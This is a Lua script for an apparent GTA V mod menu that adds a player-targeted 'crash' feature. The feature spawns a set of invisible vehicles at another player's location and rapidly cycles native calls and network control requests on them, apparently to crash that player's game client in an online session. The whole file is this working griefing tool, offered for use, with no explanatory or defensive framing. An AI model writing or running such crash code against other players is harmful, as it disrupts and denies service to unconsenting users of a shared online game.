function main()
    assert(menu.is_trusted_mode_enabled(eTrustedFlags.LUA_TRUST_NATIVES), "Natives trusted required")

    menu.add_player_feature("Shitfuck Crash", "toggle", 0, function(f, p)
        local vehs = {}
        local c = player.get_player_coords(p)
        local m = {
            "dubsta",
            "astron",
            "huntley",
            "patriot",
            "ingot",
            "asea",
            "stratum",
            "adder",
            "ninef",
            "baller",
            "comet2",
            "zentorno",
            "bifta",
        }
        
        for i=1,#m do
            local h = gameplay.get_hash_key(m[i])
            menu.notify(h)
            
            streaming.request_model(h)
            
            while not streaming.has_model_loaded(h) do
                system.wait(0)
            end
            
            c.z = c.z + 1.0
            vehs[i] = vehicle.create_vehicle(h, c, 0, true, false)
            
            streaming.set_model_as_no_longer_needed(h)
        end
        
        while f.on do
        
            for i=1,#vehs do
                entity.set_entity_visible(vehs[i], false)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 0, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 1, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 2, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 3, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 4, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 5, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 6, true)
                native.call(0x2FA133A4A9D37ED8, vehs[i], 7, true)
                system.wait(0)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 0, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 1, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 2, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 3, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 4, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 5, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 6, false)
                native.call(0xD4D4F6A4AB575A33, vehs[i], 7, false)
            end
            
            system.wait(100)
            
            for i=1,#vehs do
                network.request_control_of_entity(vehs[i])
                native.call(0x115722B1B9C14C1C, vehs[i])
            end
        
            system.wait(100)
        end
        
        for i=1,#vehs do
            entity.delete_entity(vehs[i])
        end
    end)
end

main()